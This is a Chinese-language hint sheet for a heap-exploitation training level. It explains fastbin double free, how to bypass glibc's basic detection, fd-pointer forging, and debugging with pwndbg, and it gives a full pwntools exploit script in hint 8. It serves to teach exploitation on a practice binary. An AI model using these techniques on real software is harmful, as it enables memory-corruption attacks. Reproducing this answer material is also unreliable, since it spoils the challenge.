# Level 3: Fastbin Double Free - 提示

<details>
<summary><b>提示 1: 理解漏洞</b></summary>

程序有一个典型的 **Use-After-Free / Double Free** 漏洞：
- `case 2`: free chunk 后没有清空指针
- 你可以对同一个 chunk free 多次!

为什么这很重要？
- Fastbin 使用 LIFO (后进先出) 单链表
- Double free 可以操纵这个链表结构
- 目标：控制 `chunks[0]` 的内容为 `0x4141414141414141`

</details>

<details>
<summary><b>提示 2: Fastbin Double Free 原理</b></summary>

Fastbin 的单链表结构：
```
fastbin[0x20] → Chunk A → Chunk B → NULL
```

Double Free 后：
```
fastbin[0x20] → Chunk A → Chunk B → Chunk A → ...
                   └─────────────────┘
                         循环!
```

这意味着你可以：
1. 分配到同一个 chunk 多次
2. 操纵链表的 fd (forward) 指针
3. 让 malloc 返回任意地址

</details>

<details>
<summary><b>提示 3: 避免检测</b></summary>

glibc 有基本的 double free 检测：
```c
if (chunk == fastbin(idx)->fd) {
    // double free detected!
}
```

**绕过方法**: 在两次 free 之间插入不同的 chunk：
```
1. free(chunk0)     // fastbin → 0
2. free(chunk2)     // fastbin → 2 → 0
3. free(chunk0)     // fastbin → 0 → 2 → 0 ✓ 通过!
                        └────────┘
                         0 不在链表头部
```

**关键**: 至少需要 3 个 chunk!

</details>

<details>
<summary><b>提示 4: 攻击步骤</b></summary>

```python
# 步骤 1: 分配 3 个 chunk
alloc(32)   # index 0 (chunk0)
alloc(32)   # index 1 (chunk1) - 防止与 top 合并
alloc(32)   # index 2 (chunk2)

# 步骤 2: 创建 double free
free(0)     # free chunk0
free(2)     # free chunk2
free(0)     # double free chunk0!

# 步骤 3: 分配 chunk0，修改其 fd 指针
alloc(32)   # 拿回 chunk0
edit(0, payload)  # payload 包含伪造的 fd

# 步骤 4: 继续分配，最终控制目标
alloc(32)   # chunk2
alloc(32)   # chunk0 (从 fastbin)
alloc(32)   # 下一个分配由 fd 决定!
```

</details>

<details>
<summary><b>提示 5: 胜利条件分析</b></summary>

```c
if (*(unsigned long*)chunks[0] == 0x4141414141414141) {
    winner();
}
```

你需要：
1. 控制 chunks[0] 指向的内存
2. 修改其前 8 字节为 `0x4141414141414141`

**策略**：
- 让某个 malloc 返回 `chunks[0]` 的地址
- 或让 `chunks[0]` 指向一个可控制的地址

**最简单的方法**：
1. 通过 double free 让 fastbin 链表包含 `chunks[0]`
2. Edit `chunks[0]` 为目标值

</details>

<details>
<summary><b>提示 6: Payload 构造</b></summary>

当你 edit chunk0 时，你实际上在编辑它的用户数据部分。
但在 fastbin 中，空闲 chunk 的前 8 字节是 **fd 指针**！

```
Chunk 布局:
+-----------------+
| prev_size (8B)  | ← (通常不用)
+-----------------+
| size (8B)       | ← 包含大小和标志
+-----------------+
| fd (8B)         | ← 空闲时，指向下一个 chunk
+-----------------+
| bk (8B)         | ← fastbin 不用
+-----------------+
| user data       |
+-----------------+
```

如果你想让下一个 malloc 返回地址 X：
```python
fd_value = X - 0x10  # 减去 chunk 头大小
payload = p64(fd_value)
```

**但是**，本关的目标更简单：直接控制 chunks[0] 的内容！

</details>

<details>
<summary><b>提示 7: 简化策略</b></summary>

观察胜利条件：
```c
if (*(unsigned long*)chunks[0] == 0x4141414141414141)
```

**关键发现**：
- chunks[0] 在 index 0
- 你可以通过 Edit 修改它！
- 问题：需要先分配它

**简化流程**：
```python
# 1. 创建 double free
alloc(32)  # idx 0
alloc(32)  # idx 1
alloc(32)  # idx 2
free(0)
free(2)
free(0)  # double free!

# 2. 连续分配，再次拿到 chunk0
alloc(32)  # idx 0 (拿回 chunk0)
alloc(32)  # idx 3
alloc(32)  # idx 4

# 3. Edit chunks[0] 为目标值
edit(0, p64(0x4141414141414141))

# 4. Check win condition!
check()
```

</details>

<details>
<summary><b>提示 8: 完整 Exploit</b></summary>

```python
from pwn import *

context.log_level = 'debug'

p = process('./vuln')
# 或 p = remote('host', port)

def alloc(size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    if data:
        p.sendafter(b'Data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def check():
    p.sendlineafter(b'> ', b'5')

# 步骤 1: 分配 3 个 chunk
alloc(32)   # idx 0 - chunk A
alloc(32)   # idx 1 - chunk B (防止合并)
alloc(32)   # idx 2 - chunk C

# 步骤 2: 创建 double free
free(0)     # free A
free(2)     # free C
free(0)     # double free A!

# 步骤 3: 再次分配 chunk A (idx 0)
alloc(32)   # 拿回 A，现在 idx 0 指向 A

# 步骤 4: 编辑 chunk A 的内容
edit(0, p64(0x4141414141414141))

# 步骤 5: 检查胜利条件
check()

p.interactive()
```

</details>

<details>
<summary><b>提示 9: 调试方法</b></summary>

使用 pwndbg 观察 fastbin：

```bash
$ gdb ./vuln
(gdb) b *main+XXX  # 在 free 后断点
(gdb) run

# 第一次 free(0)
(gdb) fastbin
fastbins[idx=0, size=0x20]
  0x555555559000

# free(2)
(gdb) fastbin
fastbins[idx=0, size=0x20]
  0x5555555590a0
  0x555555559000

# double free(0)
(gdb) fastbin
fastbins[idx=0, size=0x20]
  0x555555559000  ← 重复!
  0x5555555590a0
  0x555555559000
```

你也可以使用 `heap` 命令查看堆布局！

</details>

<details>
<summary><b>提示 10: 常见错误</b></summary>

**错误 1**: "double free or corruption"
- 原因：连续两次 free 同一个 chunk
- 解决：中间 free 另一个 chunk

**错误 2**: "invalid pointer"
- 原因：size 不在 fastbin 范围
- 解决：使用 size < 128 (如 32, 64)

**错误 3**: malloc 返回的地址不对
- 原因：没有正确理解 LIFO 顺序
- 解决：画出 fastbin 链表，追踪分配顺序

**错误 4**: chunks[0] 内容没变
- 原因：edit 的数据长度不够
- 解决：确保发送至少 8 字节

</details>

<details>
<summary><b>提示 11: 进阶挑战</b></summary>

**挑战 1**: 分配到栈上
```python
# 目标：让 malloc 返回栈上的地址
stack_var = 0x7fffffffe000

# 修改 fd 指针指向 stack_var
# ...
```

**挑战 2**: 分配到 .bss 段
```python
# 目标：控制全局变量
# 需要泄露地址或使用固定偏移
```

**挑战 3**: 绕过 Safe Linking (glibc 2.32+)
- 需要堆地址泄露
- 使用部分覆盖
- 参考 how2heap 的 safe_linking 技术

</details>
